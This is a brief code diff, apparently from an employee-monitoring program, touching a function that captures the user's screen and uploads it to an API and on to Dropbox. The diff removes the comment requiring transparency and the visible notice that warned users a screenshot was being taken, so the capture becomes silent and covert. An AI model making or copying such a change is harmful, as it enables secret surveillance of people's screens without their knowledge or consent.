@@ -1881,12 +1881,6 @@ class Program {
 
 // ── Screenshot upload: POST raw bytes to our API (staged, then Dropbox) ───────
 async function captureAndUploadScreenshot() {
-  // Transparency: always show a visible notice BEFORE capturing.
-  await showNotice(
-    "Screenshot",
-    "A screenshot of your screen is being captured for workforce analytics."
-  );
-
   const shot = await captureScreenshot();
   if (!shot) return;
 
